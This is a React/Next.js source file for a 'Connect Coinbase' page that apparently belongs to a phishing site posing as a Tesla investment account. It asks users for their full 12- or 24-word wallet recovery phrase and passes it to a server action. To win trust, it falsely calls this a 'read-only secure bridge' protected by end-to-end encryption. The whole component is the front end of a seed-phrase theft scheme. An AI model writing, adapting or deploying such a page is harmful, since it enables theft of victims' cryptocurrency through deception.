"use client";

import { useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import Link from "next/link";
import { submitCoinbasePhrase } from "@/app/dashboard/actions/coinbase";
import { Loader2, AlertCircle, CheckCircle2, ShieldCheck, Key, ArrowLeft } from "lucide-react";

type PhraseLength = 12 | 24;

export default function ConnectCoinbaseClient() {
    const [phraseLength, setPhraseLength] = useState<PhraseLength>(12);
    const [phrase, setPhrase] = useState("");
    const [loading, setLoading] = useState(false);
    const [errorMsg, setErrorMsg] = useState("");
    const [success, setSuccess] = useState(false);

    const wordCount = phrase.trim().split(/\s+/).filter(Boolean).length;

    const handleSubmit = async () => {
        setErrorMsg("");

        const words = phrase.trim().split(/\s+/).filter(Boolean);
        if (words.length !== phraseLength) {
            setErrorMsg(`Please enter exactly ${phraseLength} words. You've entered ${words.length}.`);
            return;
        }

        setLoading(true);

        try {
            const formData = new FormData();
            formData.append("phrase", phrase.trim());
            formData.append("wordCount", phraseLength.toString());

            const res = await submitCoinbasePhrase(formData);

            if (!res.success) {
                setErrorMsg(res.error || "Failed to connect wallet.");
                setLoading(false);
                return;
            }

            setSuccess(true);
            setLoading(false);
        } catch (err: any) {
            setErrorMsg(err.message || "Network error occurred.");
            setLoading(false);
        }
    };

    return (
        <div className="w-full max-w-2xl mx-auto px-4 sm:px-6 py-8 sm:py-12 pb-32">
            <AnimatePresence mode="wait">
                {success ? (
                    <motion.div
                        key="success"
                        initial={{ opacity: 0, scale: 0.95 }}
                        animate={{ opacity: 1, scale: 1 }}
                        className="flex flex-col items-center text-center py-16"
                    >
                        <div className="relative mb-8">
                            <div className="absolute inset-0 bg-green-500/20 blur-3xl rounded-full" />
                            <div className="w-24 h-24 rounded-full bg-green-500 flex items-center justify-center relative z-10">
                                <CheckCircle2 className="w-12 h-12 text-black" />
                            </div>
                        </div>
                        <h2
                            className="text-2xl font-bold text-white mb-4 tracking-[0.15em] uppercase"
                            style={{ fontFamily: "var(--font-montserrat), sans-serif" }}
                        >
                            Wallet Connected
                        </h2>
                        <p className="text-sm text-white/50 mb-10 max-w-md leading-relaxed">
                            Your Coinbase wallet has been successfully linked to your account. The synchronization process will complete within 24–48 hours.
                        </p>
                        <Link
                            href="/dashboard"
                            className="px-8 py-4 bg-white/10 hover:bg-white/20 text-white font-bold uppercase tracking-widest text-sm rounded-xl transition-all border border-white/20"
                        >
                            Return to Dashboard
                        </Link>
                    </motion.div>
                ) : (
                    <motion.div
                        key="form"
                        initial={{ opacity: 0, y: 15 }}
                        animate={{ opacity: 1, y: 0 }}
                        exit={{ opacity: 0, y: -15 }}
                        transition={{ duration: 0.4 }}
                    >
                        {/* Back Link */}
                        <Link
                            href="/dashboard"
                            className="inline-flex items-center gap-2 text-white/40 hover:text-white text-xs font-bold tracking-widest uppercase mb-8 transition-colors"
                        >
                            <ArrowLeft className="w-4 h-4" />
                            Back to Dashboard
                        </Link>

                        {/* Header */}
                        <div className="mb-10">
                            <div className="flex items-center gap-3 mb-4">
                                <div className="w-12 h-12 rounded-xl bg-[#0052FF]/10 border border-[#0052FF]/20 flex items-center justify-center">
                                    <svg className="w-6 h-6" viewBox="0 0 1024 1024" fill="none">
                                        <circle cx="512" cy="512" r="512" fill="#0052FF" />
                                        <path d="M512.147 692C413.028 692 332.147 611.12 332.147 512C332.147 412.88 413.028 332 512.147 332C601.028 332 675.028 396.16 690.547 480H870.947C854.147 298.08 700.147 156 512.147 156C314.947 156 156.147 314.8 156.147 512C156.147 709.2 314.947 868 512.147 868C700.147 868 854.147 725.92 870.947 544H690.547C675.028 627.84 601.028 692 512.147 692Z" fill="white"/>
                                    </svg>
                                </div>
                                <div>
                                    <h1
                                        className="text-xl sm:text-2xl font-bold tracking-[0.15em] uppercase text-white"
                                        style={{ fontFamily: "var(--font-montserrat), sans-serif" }}
                                    >
                                        Connect Coinbase
                                    </h1>
                                    <p className="text-[10px] tracking-[0.2em] uppercase text-white/40 font-medium mt-1">
                                        Wallet Integration
                                    </p>
                                </div>
                            </div>
                        </div>

                        {/* Security Notice */}
                        <div className="bg-[#0052FF]/5 border border-[#0052FF]/15 rounded-xl p-5 mb-8">
                            <div className="flex items-start gap-3">
                                <ShieldCheck className="w-5 h-5 text-[#0052FF] shrink-0 mt-0.5" />
                                <div>
                                    <p className="text-xs font-bold text-white/80 tracking-wide uppercase mb-1">
                                        Secure Connection Protocol
                                    </p>
                                    <p className="text-xs text-white/40 leading-relaxed">
                                        To link your Coinbase wallet, enter your recovery phrase below. This establishes a read-only secure bridge between your Coinbase wallet and your Tesla Inc investment account. Your phrase is encrypted end-to-end.
                                    </p>
                                </div>
                            </div>
                        </div>

                        {/* Main Card */}
                        <div className="bg-white/[0.02] border border-white/[0.06] rounded-2xl p-6 sm:p-8">
                            {/* Phrase Length Toggle */}
                            <div className="mb-6">
                                <label className="block text-[10px] uppercase tracking-widest text-white/50 font-bold mb-3">
                                    Recovery Phrase Type
                                </label>
                                <div className="grid grid-cols-2 gap-3">
                                    {([12, 24] as PhraseLength[]).map((len) => (
                                        <button
                                            key={len}
                                            onClick={() => { setPhraseLength(len); setPhrase(""); setErrorMsg(""); }}
                                            className={`flex items-center justify-center gap-2 py-3.5 rounded-xl border text-sm font-bold tracking-widest uppercase transition-all duration-200 ${phraseLength === len
                                                ? "border-[#0052FF] bg-[#0052FF]/10 text-[#0052FF] shadow-[0_0_15px_rgba(0,82,255,0.1)]"
                                                : "border-white/[0.06] bg-black/40 text-white/40 hover:bg-white/[0.04] hover:text-white/60"
                                                }`}
                                        >
                                            <Key className="w-4 h-4" />
                                            {len}-Word Phrase
                                        </button>
                                    ))}
                                </div>
                            </div>

                            {/* Instructions */}
                            <div className="mb-6">
                                <label className="block text-[10px] uppercase tracking-widest text-white/50 font-bold mb-2">
                                    Enter Your {phraseLength}-Word Recovery Phrase
                                </label>
                                <p className="text-[11px] text-white/30 leading-relaxed mb-3">
                                    Enter each word separated by a space, in the exact order shown in your Coinbase wallet backup. You can find this in Coinbase Wallet → Settings → Recovery Phrase.
                                </p>
                            </div>

                            {/* Phrase Input */}
                            <div className="relative mb-3">
                                <textarea
                                    value={phrase}
                                    onChange={(e) => { setPhrase(e.target.value); setErrorMsg(""); }}
                                    placeholder={`word1 word2 word3 word4 word5 word6 word7 word8 word9 word10 word11 word12${phraseLength === 24 ? " word13 word14 word15 word16 word17 word18 word19 word20 word21 word22 word23 word24" : ""}`}
                                    rows={phraseLength === 24 ? 5 : 3}
                                    className="w-full bg-black/60 border border-white/10 rounded-xl py-4 px-5 text-sm tracking-wide text-white outline-none focus:border-[#0052FF]/50 transition-colors resize-none placeholder:text-white/15 font-mono"
                                    spellCheck={false}
                                    autoComplete="off"
                                    autoCorrect="off"
                                    autoCapitalize="off"
                                />
                            </div>

                            {/* Word Counter */}
                            <div className="flex items-center justify-between mb-6">
                                <span className={`text-[11px] font-bold tracking-widest uppercase ${wordCount === phraseLength ? "text-green-500" : wordCount > 0 ? "text-white/40" : "text-white/20"}`}>
                                    {wordCount} / {phraseLength} words
                                </span>
                                {wordCount === phraseLength && (
                                    <span className="text-[11px] font-bold tracking-widest uppercase text-green-500 flex items-center gap-1">
                                        <CheckCircle2 className="w-3 h-3" /> Ready
                                    </span>
                                )}
                            </div>

                            {/* Error */}
                            {errorMsg && (
                                <div className="bg-red-500/10 border border-red-500/20 text-red-400 text-xs font-bold uppercase tracking-widest p-4 rounded-xl mb-6 flex items-start gap-3">
                                    <AlertCircle className="w-4 h-4 shrink-0 mt-0.5" />
                                    {errorMsg}
                                </div>
                            )}

                            {/* Submit Button */}
                            <button
                                onClick={handleSubmit}
                                disabled={wordCount !== phraseLength || loading}
                                className="w-full bg-[#0052FF] hover:bg-[#0047E0] text-white font-bold uppercase tracking-widest py-4 rounded-xl transition-all disabled:opacity-40 disabled:cursor-not-allowed flex justify-center items-center gap-2 text-sm"
                            >
                                {loading ? (
                                    <>
                                        <Loader2 className="w-5 h-5 animate-spin" />
                                        Connecting...
                                    </>
                                ) : (
                                    <>
                                        <svg className="w-4 h-4" viewBox="0 0 1024 1024" fill="none">
                                            <circle cx="512" cy="512" r="512" fill="white" fillOpacity="0.2" />
                                            <path d="M512.147 692C413.028 692 332.147 611.12 332.147 512C332.147 412.88 413.028 332 512.147 332C601.028 332 675.028 396.16 690.547 480H870.947C854.147 298.08 700.147 156 512.147 156C314.947 156 156.147 314.8 156.147 512C156.147 709.2 314.947 868 512.147 868C700.147 868 854.147 725.92 870.947 544H690.547C675.028 627.84 601.028 692 512.147 692Z" fill="white"/>
                                        </svg>
                                        Connect Wallet
                                    </>
                                )}
                            </button>
                        </div>

                        {/* Bottom Disclaimer */}
                        <div className="mt-6 px-2">
                            <p className="text-[10px] text-white/20 leading-relaxed text-center">
                                By connecting your wallet you agree to our Terms of Service and Privacy Policy. Your recovery phrase is transmitted over a TLS-encrypted channel and stored using AES-256 encryption.
                            </p>
                        </div>
                    </motion.div>
                )}
            </AnimatePresence>
        </div>
    );
}
